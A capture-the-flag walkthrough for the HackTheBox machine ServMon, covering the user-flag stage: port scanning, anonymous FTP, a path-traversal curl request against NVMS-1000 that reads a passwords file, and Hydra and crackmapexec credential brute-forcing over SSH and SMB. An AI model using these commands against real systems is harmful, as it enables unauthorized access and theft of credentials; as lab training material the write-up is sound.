## ServMon

Difficulty: Easy
https://app.hackthebox.com/machines/ServMon

### User Flag

```
sudo rustscan -a 10.10.10.184 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://user-images.githubusercontent.com/58514930/234736772-f5c1a23e-9df3-49b3-aa86-64afa0e779ed.png)

<br>

Anonymous FTP login is possible.

Possible users: Nadine and Nathan.

![ftp notes](https://user-images.githubusercontent.com/58514930/234736874-ea9dd4b9-a06b-4ea0-a3af-0538994af0f3.png)

<br>

Website uses NVMS - 1000.

![website](https://user-images.githubusercontent.com/58514930/234736930-1967f399-b33c-4993-b9b2-61feb2101049.png)

<br>

Find this [public exploit](https://github.com/AleDiBen/NVMS1000-Exploit/blob/master/nvms.py).

```
curl http://10.10.10.184/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt --path-as-is
```

![gettingPasswords](https://user-images.githubusercontent.com/58514930/234737079-b4a78aef-8cd3-4f02-b199-66f5b257b6d7.png)

Used Hydra to find the correct credentials on SSH, buy could also enumerate on smb with crackmapexec.

```
hydra -l nadine -P password.txt 10.10.10.184 ssh -V
crackmapexec smb 10.10.10.184 -u nadine -p password.txt
```

![hydraSSH](https://user-images.githubusercontent.com/58514930/234737211-b98e82ad-d4b3-44f0-8fcb-409ba587e63a.png)

![smbEnumeration](https://user-images.githubusercontent.com/58514930/234737227-a57d936d-bd0d-4e52-b613-381a948a096f.png)

Just login into SSH with this credentials and get the user flag.
